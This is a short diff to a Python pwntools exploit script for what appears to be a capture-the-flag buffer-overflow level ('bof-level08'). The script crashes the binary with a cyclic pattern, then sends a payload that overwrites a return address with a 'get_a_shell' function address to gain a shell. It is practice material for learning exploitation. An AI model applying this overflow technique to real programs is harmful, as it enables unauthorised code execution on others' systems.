@@ -4,10 +4,8 @@ import os
 
 DEBUG = False # toggles gdb.debug or process
 elf = ELF('./bof-level08') # replace this with the actual level
-get_a_shell = p64(elf.symbols["get_a_shell"])
 
 # crash the process to get a core file and find the buffer address (still boilerplate)
-
 io = elf.process(env={}, setuid=False)
 io.sendline(cyclic(10000)) # send 1000 junk characters
 io.wait()
@@ -26,13 +24,11 @@ if DEBUG:
 else:
     io = elf.process(env={"a":"a"*32})
 
-
 # END SETUP BOILERPLATE
 # BEGIN CHALLENGE-SPECIFIC CODE
+get_a_shell = p64(elf.symbols["get_a_shell"])
 
-print(buffer_address)
 max_len = 0x129
-
 
 payload = cyclic(max_len).replace(b"iaaajaaa", get_a_shell)
 io.sendline(payload)
